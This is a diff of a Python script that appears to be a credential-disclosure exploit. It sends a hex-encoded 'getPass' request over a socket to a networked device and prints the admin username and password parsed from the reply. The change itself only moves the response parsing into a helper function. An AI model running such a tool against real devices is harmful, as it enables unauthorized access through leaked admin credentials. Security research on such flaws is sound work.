@@ -22,6 +22,18 @@ parser.add_argument('-v','--verbose',
 
 args = parser.parse_args()
 
+# Data parser
+def parse_data(self):
+    l = []
+
+    for x in self.decode(errors='ignore').split('\x00'):
+        resp = re.search(r'^[\x21-\x7F]+$', x)
+        if resp:
+            l.append(resp.group(0))
+
+    return(l)
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(2)
 
@@ -47,35 +59,18 @@ if not len(resp) > 16:
     print('\nSomething went wrong, exiting script...\n')
     sys.exit(-1)
 
-# List objects for the data
-systemData = []
-userData = []
-
 # If -v is called, print out system data
 if args.verbose:
-    #print('INITIAL RESPONSE: %s\n' % resp) # Ugly version of verbose system data
-    #print('INITIAL RESPONSE: %s\n' % resp.split(b'\x00'))
-    for x in resp.split(b'\x00'):
-        x = x.decode(errors="ignore")
-        # Only use the printable chars
-        resp = re.search(r'^[\x21-\x7F]+$', x)
-
-        if resp:
-            if len(resp.group(0)) > 1:
-                systemData.append(resp.group(0))
-    print(f"\n[VERBOSE] SYSTEM DATA: {sorted(set(systemData))}")
+    print(f"[VERBOSE] SYSTEM_DATA: {parse_data(resp)}")
 
 # Get the user data
 s.send(binascii.unhexlify(str_getPass))
 resp = s.recv(1024)
 
-for x in resp.decode(errors='ignore').split('\x00'):
-    resp = re.search(r'^[\x21-\x7F]+$', x)
-    if resp:
-        userData.append(resp.group(0))
+userData = parse_data(resp)
 
 if args.verbose:
-    print(f"[VERBOSE] USER DATA:   {userData}")
+    print(f"[VERBOSE] USER_DATA:   {userData}")
 
 # Admin pass/user is always 0 and 1 slices respectively
 print(f"\n[INFO] ADMIN USER: {userData[1]}")
